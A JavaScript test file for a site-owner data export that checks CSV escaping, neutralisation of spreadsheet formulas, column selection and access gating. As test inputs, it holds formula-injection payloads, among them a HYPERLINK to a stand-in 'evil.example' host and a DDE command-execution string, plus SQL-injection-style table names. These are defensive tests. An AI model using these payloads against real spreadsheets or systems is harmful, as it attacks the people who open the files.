// The owner taking their data out.
//
// A CSV export of a `collect` table is, by definition, text a stranger typed
// into a form — and Excel, LibreOffice and Sheets all EVALUATE a cell that
// begins `=`, `+`, `-` or `@`. The person attacked is the owner, by their own
// spreadsheet, using data our API handed them. Most of this file is about that.
import { test } from "node:test";
import assert from "node:assert/strict";
import { handleOwnerExport, csvCell, toCsv, exportColumns, MAX_EXPORT_ROWS } from "../site-export.mjs";

const SPEC = {
  tables: [{ name: "bookings", access: "collect", columns: [{ name: "customer_name" }, { name: "notes" }] }],
};

function harness(over = {}) {
  const seen = [];
  const deps = {
    gate: async () => ({}),
    dbFor: async () => "postgres://conn",
    loadSchema: async () => SPEC,
    query: async (_db, sql, args) => { seen.push({ sql, args }); return over.rows || [{ id: 1, created_at: "2026-07-28 10:00:00", customer_name: "Ada", notes: "window seat", _fts: "'ada':1" }]; },
    ident: (n) => '"' + n + '"',
    ...over.deps,
  };
  return { deps, seen };
}
const ex = (deps, o = {}) => handleOwnerExport(deps, { slug: "cafe", uid: "owner-1", table: "bookings", ...o });

// ══════════════════════════════════════════════════════ the formula problem

test("a formula in a submitted field is neutralised, not exported live", () => {
  // =HYPERLINK("https://evil/?"&A1,"receipt") builds a link out of the
  // neighbouring cell the moment the owner opens the file.
  for (const evil of [
    '=HYPERLINK("https://evil.example","click")',
    "=cmd|'/c calc'!A1",
    "+1+1",
    "@SUM(A1:A9)",
    "\tleading tab",
    "\rleading cr",
    "-1+1",
    "=1+1",
  ]) {
    const out = csvCell(evil);
    const inner = out.startsWith('"') ? out.slice(1, -1) : out;
    assert.ok(inner.startsWith("'"), `not neutralised: ${JSON.stringify(out)}`);
  }
});

test("quoting alone would NOT have been enough", () => {
  // The CSV parser strips the quotes before the formula parser sees the cell,
  // so a quoted =formula is still a formula. The value itself has to change.
  const out = csvCell('=1+1');
  assert.ok(out.includes("'=1+1"), out);
});

test("ordinary negative numbers are NOT corrupted", () => {
  // `-` is in the dangerous set for a real reason, but it is also how every
  // negative number begins. Prefixing those would break ordinary data in the
  // common case to defend against the rare one.
  assert.equal(csvCell(-5), "-5");
  assert.equal(csvCell("-5"), "-5");
  assert.equal(csvCell("-12.75"), "-12.75");
  assert.equal(csvCell(-0.5), "-0.5");
  // But a `-` that is not simply a number is still neutralised.
  assert.equal(csvCell("-1+1"), "'-1+1");
  assert.equal(csvCell("-5 chairs"), "'-5 chairs");
});

test("ordinary text is untouched", () => {
  for (const v of ["Ada", "window seat", "28", "2026-07-28", "a@b.c", "50% off"]) {
    assert.equal(csvCell(v), String(v), v);
  }
});

// ═════════════════════════════════════════════════════════ the CSV grammar

test("commas, quotes and newlines are escaped the way CSV says", () => {
  assert.equal(csvCell("a,b"), '"a,b"');
  assert.equal(csvCell('say "hi"'), '"say ""hi"""', "a quote is doubled, not backslashed");
  assert.equal(csvCell("line1\nline2"), '"line1\nline2"');
  // A control character only triggers the formula guard when it LEADS. Here it
  // is mid-value, so the cell is quoted (CSV requires it) but not rewritten.
  assert.equal(csvCell("has\rcr"), '"has\rcr"');
  assert.equal(csvCell("\rleads"), `"'\rleads"`, "leading is a different matter");
});

test("nothing becomes the empty cell, not the word null", () => {
  assert.equal(csvCell(null), "");
  assert.equal(csvCell(undefined), "");
  assert.equal(csvCell(""), "");
});

test("an object column is exported as JSON, not [object Object]", () => {
  assert.equal(csvCell({ a: 1 }), '"{""a"":1}"');
});

test("the file is header-plus-rows with CRLF endings", () => {
  const csv = toCsv(["id", "name"], [{ id: 1, name: "Ada" }, { id: 2, name: "Bo,b" }]);
  assert.equal(csv, 'id,name\r\n1,Ada\r\n2,"Bo,b"\r\n');
});

test("a missing value in one row does not shift the columns", () => {
  const csv = toCsv(["a", "b", "c"], [{ a: 1, c: 3 }]);
  assert.equal(csv, "a,b,c\r\n1,,3\r\n", "every row must have the same number of commas");
});

// ═══════════════════════════════════════════════════════════ which columns

test("id and created_at lead, then the declared columns", () => {
  const cols = exportColumns(SPEC.tables[0], []);
  assert.deepEqual(cols, ["id", "created_at", "customer_name", "notes"]);
});

test("a column the table really has but the schema never named is still exported", () => {
  // An export that silently drops a column is not a backup.
  const cols = exportColumns(SPEC.tables[0], [{ id: 1, customer_name: "Ada", position: 3, extra: "x" }]);
  assert.ok(cols.includes("position"), cols.join(","));
  assert.ok(cols.includes("extra"), cols.join(","));
});

test("the search vector is never a column", () => {
  const cols = exportColumns(SPEC.tables[0], [{ id: 1, _fts: "'ada':1" }]);
  assert.ok(!cols.includes("_fts"), cols.join(","));
});

test("a declared column is never listed twice", () => {
  const def = { columns: [{ name: "id" }, { name: "created_at" }, { name: "notes" }, { name: "notes" }] };
  const cols = exportColumns(def, [{ id: 1, notes: "x" }]);
  assert.deepEqual(cols, ["id", "created_at", "notes"]);
});

// ════════════════════════════════════════════════════════════ the response

test("a CSV export downloads as a file, with the site and table in its name", async () => {
  const { deps } = harness();
  const r = await ex(deps);
  assert.equal(r.status, 200);
  assert.match(r.headers["content-type"], /text\/csv/);
  assert.equal(r.headers["content-disposition"], 'attachment; filename="cafe-bookings.csv"');
  assert.match(r.body, /^id,created_at,customer_name,notes\r\n/);
  assert.match(r.body, /Ada/);
});

test("attachment, not inline — it is owner-supplied text on our own origin", async () => {
  const { deps } = harness();
  for (const format of ["csv", "json"]) {
    const r = await ex(deps, { format });
    assert.match(r.headers["content-disposition"], /^attachment;/, format);
  }
});

test("the search vector never reaches the file", async () => {
  const { deps } = harness();
  assert.ok(!(await ex(deps)).body.includes("_fts"));
  assert.ok(!(await ex(deps, { format: "json" })).body.includes("_fts"));
});

test("json is offered too, and is real json", async () => {
  const { deps } = harness();
  const r = await ex(deps, { format: "json" });
  assert.match(r.headers["content-type"], /application\/json/);
  const parsed = JSON.parse(r.body);
  assert.equal(parsed.table, "bookings");
  assert.equal(parsed.rows[0].customer_name, "Ada");
});

test("an unknown format is a CSV, not an error", async () => {
  // The button only ever sends csv or json; anything else is a typed URL.
  const { deps } = harness();
  for (const format of ["xlsx", "", null, "CSV"]) {
    assert.match((await ex(deps, { format })).headers["content-type"], /text\/csv/, String(format));
  }
});

test("the export is bounded", async () => {
  const { deps, seen } = harness();
  await ex(deps);
  assert.deepEqual(seen[0].args, [MAX_EXPORT_ROWS]);
  assert.match(seen[0].sql, /LIMIT \?/);
});

test("oldest first — a backup reads like a ledger, not a feed", async () => {
  const { deps, seen } = harness();
  await ex(deps);
  assert.match(seen[0].sql, /ORDER BY "id" ASC/);
});

// ═══════════════════════════════════════════════════════════════ the gate

test("exporting a site that is not yours is refused, and reads nothing", async () => {
  const denied = { error: { status: 404, body: { error: "no such site" } } };
  const { deps, seen } = harness({ deps: { gate: async () => denied } });
  assert.equal((await ex(deps)).status, 404);
  assert.deepEqual(seen, [], "not one row of someone else's data was read");
});

test("a table the schema never declared is refused before any query", async () => {
  const { deps, seen } = harness();
  for (const table of ["_users", "pg_shadow", "bookings; DROP TABLE x", "", null]) {
    assert.equal((await ex(deps, { table })).status, 404, JSON.stringify(table));
  }
  assert.deepEqual(seen, []);
});

test("an unknown site is 404", async () => {
  const { deps } = harness({ deps: { dbFor: async () => null } });
  assert.equal((await ex(deps)).status, 404);
});
